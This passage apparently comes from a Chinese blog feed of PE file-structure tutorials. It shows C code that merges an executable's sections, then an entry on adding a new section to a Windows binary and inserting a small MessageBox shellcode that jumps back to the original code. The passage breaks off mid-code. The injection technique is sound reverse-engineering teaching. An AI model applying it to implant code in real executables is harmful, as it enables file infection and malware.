class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EnlargeSize 0x1000</span><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">FileToImage</span><span class="hljs-params">(<span class="hljs-type">char</span>* filebuffer)</span>&#123;<br><br>    <span class="hljs-comment">//定义一些指针</span><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>* TemBuffer = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//简单判断有效性</span><br>    <span class="hljs-keyword">if</span> (!filebuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (*(PWORD)filebuffer != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not a PE file!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//开始赋值相应指针</span><br>    DosHeader = (PIMAGE_DOS_HEADER)filebuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)  (filebuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//申请内存中大小</span><br>TemBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(OptionalHeader-&gt;SizeOfImage);<br><br>    <span class="hljs-comment">//初始化并复制头部数据</span><br>    <span class="hljs-built_in">memset</span>(TemBuffer,<span class="hljs-number">0</span>,OptionalHeader-&gt;SizeOfImage);<br>    <span class="hljs-built_in">memcpy</span>(TemBuffer,DosHeader,OptionalHeader-&gt;SizeOfHeaders);<br><br>    <span class="hljs-comment">//开始复制节区数据</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>        <span class="hljs-built_in">memcpy</span>((TemBuffer + SectionHeader-&gt;VirtualAddress),(filebuffer + SectionHeader-&gt;PointerToRawData),SectionHeader-&gt;SizeOfRawData);<br><span class="hljs-comment">//更新为下一个节区的结构体</span><br><span class="hljs-comment">// SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + 4 + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + 40 * (i + 1));</span><br>SectionHeader +=<span class="hljs-number">1</span>;<br>&#125;<br><br>    <span class="hljs-keyword">return</span> TemBuffer;<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Enlage</span><span class="hljs-params">(<span class="hljs-type">char</span>* buffer)</span>&#123;<br><span class="hljs-comment">//原buffer的头部信息</span><br>PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)buffer;<br>NTHeader = (PIMAGE_NT_HEADERS) (buffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><br><span class="hljs-comment">// char* ImageBuffer = FileToImage(buffer);</span><br><br><span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(OptionalHeader-&gt;SizeOfImage + EnlargeSize);<br><span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,OptionalHeader-&gt;SizeOfImage + EnlargeSize);<br><span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,OptionalHeader-&gt;SizeOfImage);<br><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS) (NewBuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><br>PIMAGE_SECTION_HEADER LastSectionHeader = SectionHeader + FileHeader-&gt;NumberOfSections <span class="hljs-number">-1</span>;<br>DWORD LastSize = LastSectionHeader-&gt;Misc.VirtualSize &gt; LastSectionHeader-&gt;SizeOfRawData?LastSectionHeader-&gt;Misc.VirtualSize : LastSectionHeader-&gt;SizeOfRawData;<br><br>LastSectionHeader-&gt;Misc.VirtualSize = LastSize + EnlargeSize;<br>LastSectionHeader-&gt;SizeOfRawData = LastSize + EnlargeSize;<br>OptionalHeader-&gt;SizeOfImage += EnlargeSize;<br><br><span class="hljs-keyword">return</span> NewBuffer;<br><br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Merge</span><span class="hljs-params">(<span class="hljs-type">char</span>* buffer,DWORD &amp;size)</span>&#123;<br><br><span class="hljs-type">char</span>* ImageBuffer = FileToImage(buffer);<br><br>PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER NextSectionHeader =<span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)ImageBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS) (ImageBuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(ImageBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(ImageBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(ImageBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><br>SectionHeader-&gt;Misc.VirtualSize = OptionalHeader-&gt;SizeOfImage - SectionHeader-&gt;VirtualAddress;<br>SectionHeader-&gt;SizeOfRawData = OptionalHeader-&gt;SizeOfImage - SectionHeader-&gt;VirtualAddress;<br>SectionHeader-&gt;PointerToRawData = SectionHeader-&gt;VirtualAddress;<br>NextSectionHeader = SectionHeader;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>NextSectionHeader += <span class="hljs-number">1</span>;<br>SectionHeader-&gt;Characteristics |= NextSectionHeader-&gt;Characteristics; <br>&#125;<br><br>FileHeader-&gt;NumberOfSections = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">memset</span>(NextSectionHeader,<span class="hljs-number">0</span>,IMAGE_SIZEOF_SECTION_HEADER * (FileHeader-&gt;NumberOfSections <span class="hljs-number">-1</span>));<br>size = OptionalHeader-&gt;SizeOfImage;<br><span class="hljs-keyword">return</span> ImageBuffer;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_changed.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br><span class="hljs-type">char</span>* newbuffer;<br><span class="hljs-comment">// newbuffer = Enlage(buffer);</span><br>newbuffer = Merge(buffer,size);<br><br>fwrite(newbuffer,size,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（五）</title>
    <link href="/2023/07/04/PE_4/"/>
    <url>/2023/07/04/PE_4/</url>
    
    <content type="html"><![CDATA[<p>PE练习，新增一个节并添加shellcode</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>前面已经手动在原代码区空白地方增加了shellcode，并且完成代码实现。但是往往要添加的shellcode不仅仅只有这么一点，那么就会面临代码空白区不够的地方，这时就可以考虑新增一个节，并在新增节里面添加shellcode</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>1.新增一个节后，源文件可以正常运行</p><p>2.新增一个节后，添加原来的shellcode</p><h3 id="要解决的问题"><a href="#要解决的问题" class="headerlink" title="要解决的问题"></a>要解决的问题</h3><p>Q1：如何新增一个节</p><p>A1：应当立即想到的是要修改FileHeader里的NumberOfSections成员，将其加1</p><p>Q2：如何设置新增节各个成员的属性</p><p>A2：在新增节成员属性之前，需要考虑这样一个问题，即原来的头空间区域内是否还有足够空间增加一个节目录项。在Windows中，判断一个表是否遍历完的基本操作就是查看这个表项最后是否还有同样大小的0。比如判断字符串结束的标志是0，这里就是0x24个0，因为节目录项的大小就是40个字节。如果说SizeOfHeader的大小是0x1000，而已经使用的数据占0x976及以上，那么这个时候就没有足够空间再增加一个节目录项，只有已经使用数据项小于0x952才可以再增加一个节目录项，这样添加完后，就能保证末尾一定有0x24个0来结束。</p><p>note：你一定想问要是真的不够怎么办呢。是否还记得DOS头里有一个DOS stub的垃圾数据，这时就可以考虑把NT头后面的头们全部往上提，占据DOS stub，而且只需要修改DOS Header的e_lfanew成员就行。</p><p>一般来说，这样就已经可以解决99%的问题，那如果还是不够呢？其实也不一定非要增加一个节啦，还可以扩大一个节或者合并其他节的嘛，不过这是后面的内容了。</p><p>现在来考虑各个成员如何设置：</p><ul><li>Name  可以随意一个8字节内的字符串</li><li>Misc 和 SizeOfRawData，前者可以是一个不准确的值，后者是文件对齐后的大小，二者可以设为同样的值。那么这个值是不是随意的呢，理论上是的。但是为了对齐方便，最好是文件对齐FileAlignment和内存对齐SectionAlignment的公倍数，这样可以省下很多麻烦</li><li>VisualAddress：在内存中的起始位置，其实就是上一个节区的末尾位置。而上一个节区的末尾位置就是其VisualAddress + Misc 或者VisualAddress + SizeofRawData，两者要取大的那一个，然后再内存对齐的值就是新节区VisualAddress</li><li>PointerToRawData：在文件中的起始位置，算法与VisualAddress基本相同</li></ul><p>Q3：还应该改变哪些值</p><p>A3：在OptionalHeader中还有一个成员SizeOfImage记录内存大小，在新增一个节区后这个值自然就要变大。而之前提到新增的节区大小最好是文件对齐FileAlignment和内存对齐SectionAlignment的公倍数，这样的话SizeOfImage也可以直接加上这个值，不需要再做额外功夫</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ImgaeBase  0x10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MessageBox_Addr 0x75C93D90</span><br>BYTE Shell[] = &#123;<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xE8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>&#125;;<br><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            <br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Section_add</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    DWORD size =  Size(fp);<br>    DWORD new_size = size + ADD_SIZE + <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br>    <span class="hljs-keyword">if</span> (!NewBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to creat buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,new_size);<br>    <span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,size);<br><br>    <span class="hljs-comment">//初始化PE头部信息</span><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(NewBuffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(NewBuffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//最后一个节表地址</span><br>PIMAGE_SECTION_HEADER LastSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>));<br><span class="hljs-comment">//新节表地址</span><br>PIMAGE_SECTION_HEADER NewSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader + IMAGE_SIZEOF_SECTION_HEADER * (FILEHeader-&gt;NumberOfSections));<br><br>    <span class="hljs-comment">//判断剩余空间</span><br>    DWORD Remained_size = (DWORD)(OptionalHeader-&gt;SizeOfHeaders - DosHeader-&gt;e_lfanew - <span class="hljs-number">4</span><br>- IMAGE_SIZEOF_FILE_HEADER - IMAGE_SIZEOF_SECTION_HEADER * FILEHeader-&gt;NumberOfSections);<br><span class="hljs-keyword">if</span> (Remained_size &lt; <span class="hljs-number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not have enough space!\n&quot;</span>);<br><span class="hljs-built_in">free</span>(NewBuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//===================修改信息====================</span><br><span class="hljs-comment">//其他头部需要修改的信息</span><br>FILEHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>    OptionalHeader-&gt;SizeOfImage += ADD_SIZE;<br>    <br>    <span class="hljs-comment">//填入数据</span><br>    <span class="hljs-built_in">memcpy</span>(NewSection-&gt;Name,<span class="hljs-string">&quot;.NewSec&quot;</span>,<span class="hljs-number">8</span>);<br>    NewSection-&gt;Misc.VirtualSize = ADD_SIZE;<br>    NewSection-&gt;SizeOfRawData = ADD_SIZE;<br>    NewSection-&gt;PointerToRawData = LastSection-&gt;PointerToRawData + LastSection-&gt;SizeOfRawData;<br><br>DWORD add_size = LastSection-&gt;Misc.VirtualSize &gt; LastSection-&gt;SizeOfRawData ? LastSection-&gt;Misc.VirtualSize : LastSection-&gt;SizeOfRawData;<br><br>    NewSection-&gt;VirtualAddress = LastSection-&gt;VirtualAddress + add_size;<br><br>    <span class="hljs-comment">//找到开始的地方</span><br>    <span class="hljs-keyword">if</span> (NewSection-&gt;VirtualAddress % OptionalHeader-&gt;SectionAlignment)<br>&#123;<br>NewSection-&gt;VirtualAddress = NewSection-&gt;VirtualAddress / OptionalHeader-&gt;SectionAlignment * OptionalHeader-&gt;SectionAlignment +OptionalHeader-&gt;SectionAlignment;<br>&#125;<br><br>NewSection-&gt;Characteristics = <span class="hljs-number">0x60000020</span>;<br>    <span class="hljs-comment">//到这里就已经完成节的增加了</span><br><br>    <span class="hljs-comment">//插入shellcode</span><br>    <span class="hljs-type">char</span>* shell_begin = NewBuffer + NewSection-&gt;PointerToRawData;<br><br>DWORD begin_FOA = NewSection-&gt;PointerToRawData;<br><br><br>DWORD e8_FOA = begin_FOA + <span class="hljs-number">8</span>;<br>DWORD e9_FOA = e8_FOA + <span class="hljs-number">5</span>;<br><br>DWORD begin_RVA = FOA_TO_RVA(begin_FOA,NewBuffer);<br><span class="hljs-comment">//计算call地址的编码 即e8 